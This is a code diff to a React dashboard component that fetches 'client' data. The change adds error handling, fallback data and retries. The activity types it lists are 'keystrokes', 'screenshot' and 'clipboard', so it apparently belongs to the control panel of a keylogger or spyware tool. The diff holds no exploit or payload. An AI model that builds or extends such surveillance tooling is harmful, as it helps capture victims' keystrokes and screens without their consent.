@@ -30,44 +30,58 @@ const Index = () => {
   const { data, isLoading, error } = useQuery({
     queryKey: ['indexDashboardData'],
     queryFn: async () => {
-      console.log("Fetching real dashboard data from API");
+      console.log("Fetching dashboard data from API");
       
-      // Get clients from the server API
-      const clients = await getClients();
-      
-      // Calculate active clients (active within last 30 minutes)
-      const activeClients = clients.filter(client => {
-        const lastActive = new Date(client.lastActivity);
-        return (new Date().getTime() - lastActive.getTime()) < 30 * 60 * 1000;
-      }).length;
-      
-      // Generate activity data based on real client data
-      // This is a simplified version - in a real implementation,
-      // you would fetch actual activity logs from the server
-      const activityData = generateActivityData();
-      
-      // Calculate storage used based on client count (placeholder)
-      // In a real implementation, you would get this from the server
-      const storageSize = (clients.length * 0.1).toFixed(1);
-      
-      // Get recent activities (simplified version)
-      // In a real implementation, you would fetch this from the server
-      const recentActivities = clients.slice(0, 3).map((client, index) => ({
-        id: index + 1,
-        client: client.name,
-        type: ["keystrokes", "screenshot", "clipboard"][index % 3],
-        timestamp: client.lastActivity
-      }));
-      
-      return {
-        totalClients: clients.length,
-        activeClients,
-        storageUsed: `${storageSize} GB`,
-        recentActivities,
-        activityData
-      };
+      try {
+        // Get clients from the server API
+        const clients = await getClients();
+        
+        if (!clients || clients.length === 0) {
+          console.log("No clients found, using fallback data");
+          return fallbackData;
+        }
+        
+        // Calculate active clients (active within last 30 minutes)
+        const activeClients = clients.filter(client => {
+          if (!client.lastActivity) return false;
+          const lastActive = new Date(client.lastActivity);
+          return (new Date().getTime() - lastActive.getTime()) < 30 * 60 * 1000;
+        }).length;
+        
+        console.log(`Found ${clients.length} total clients, ${activeClients} active`);
+        
+        // Generate activity data based on real client data
+        // This should be fetched from a real API endpoint in production
+        const activityData = generateActivityData();
+        
+        // Calculate storage used based on client count
+        // In production, this should come from a real API endpoint
+        const storageSize = (clients.length * 0.1).toFixed(1);
+        
+        // Create recent activities from client data
+        const recentActivities = clients.slice(0, 3).map((client, index) => ({
+          id: index + 1,
+          client: client.name,
+          type: ["keystrokes", "screenshot", "clipboard"][index % 3],
+          timestamp: client.lastActivity || new Date().toISOString()
+        }));
+        
+        console.log("Dashboard data generated successfully");
+        
+        return {
+          totalClients: clients.length,
+          activeClients,
+          storageUsed: `${storageSize} GB`,
+          recentActivities,
+          activityData
+        };
+      } catch (error) {
+        console.error("Error generating dashboard data:", error);
+        throw error;
+      }
     },
-    retry: 1,
+    retry: 2,
+    retryDelay: 1000,
     staleTime: 60000 // 1 minute
   });
 
